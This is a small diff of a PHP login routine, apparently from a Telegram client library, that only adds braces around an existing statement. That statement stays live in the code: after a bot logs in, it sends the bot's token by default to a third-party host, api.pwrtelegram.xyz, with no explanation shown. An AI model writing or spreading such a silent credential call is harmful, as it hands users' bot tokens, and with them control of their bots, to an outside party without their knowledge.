@@ -52,7 +52,9 @@ trait Login
         $this->API->updates_key = 0;
         $this->API->get_updates_state();
         $this->API->should_serialize = true;
-        if (!isset($this->API->settings['pwr']['pwr']) || !$this->settings['pwr']['pwr']) file_get_contents('https://api.pwrtelegram.xyz/bot'.$token.'/getme');
+        if (!isset($this->API->settings['pwr']['pwr']) || !$this->settings['pwr']['pwr']) {
+            file_get_contents('https://api.pwrtelegram.xyz/bot'.$token.'/getme');
+        }
         \danog\MadelineProto\Logger::log('Logged in successfully!');
 
         return $this->API->datacenter->authorization;
